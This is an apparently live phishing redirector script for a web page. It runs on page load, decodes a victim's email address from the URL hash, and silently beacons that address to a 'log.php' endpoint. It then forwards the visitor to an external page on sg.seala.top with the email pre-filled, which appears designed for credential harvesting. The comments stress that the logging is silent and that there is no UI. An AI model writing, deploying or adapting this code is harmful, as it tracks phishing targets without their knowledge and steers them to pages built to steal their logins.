<script type="text/javascript">
function validateEmail(email) {
    var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
}

function decodeBase64(s) {
    var e = {}, i, b = 0, c, x, l = 0, a, r = '', w = String.fromCharCode, L = s.length;
    var A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (i = 0; i < 64; i++) { e[A.charAt(i)] = i; }
    for (x = 0; x < L; x++) {
        c = e[s.charAt(x)];
        if (c === undefined) continue;
        b = (b << 6) + c;
        l += 6;
        while (l >= 8) {
            a = (b >>> (l -= 8)) & 0xff;
            if (a || x < (L - 2)) r += w(a);
        }
    }
    return r;
}

function logToConsole(message, data) {
    try {
        console.log("[Redirect Debug]", message, data || "");
    } catch(e) {}
}

function processRedirect() {
    try {
        var hash = window.location.hash.substring(1);
        logToConsole("Original hash:", hash);

        if (!hash) return;

        // Decode (supports double encoding fallback)
        var decoded = decodeBase64(hash);
        logToConsole("Decoded once:", decoded);

        // Try double decode if needed
        if (!validateEmail(decoded)) {
            try {
                var doubleDecoded = decodeBase64(decoded);
                if (validateEmail(doubleDecoded)) {
                    decoded = doubleDecoded;
                    logToConsole("Double decoded:", decoded);
                }
            } catch(e) {}
        }

        // Replace $ with @
        var email = decoded.replace(/\$/g, '@');

        // Final validation
        if (!validateEmail(email)) {
            logToConsole("Invalid email, stopping:", email);
            return;
        }

        // Re-encode clean email
        var newHash = btoa(email);

        // Silent logging
        try {
            navigator.sendBeacon(
                "log.php",
                JSON.stringify({ 
                    email: email,
                    original_hash: hash,
                    timestamp: new Date().toISOString()
                })
            );
        } catch (e) {}

        // Redirect
        var redirectUrl = "https://sg.seala.top/109902/mainnew3.html#" + newHash;
        logToConsole("Redirecting to:", redirectUrl);

        window.location.replace(redirectUrl);

    } catch (error) {
        console.error("Redirect error:", error);
    }
}

// Run immediately (no delay, no UI)
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', processRedirect);
} else {
    processRedirect();
}
</script>
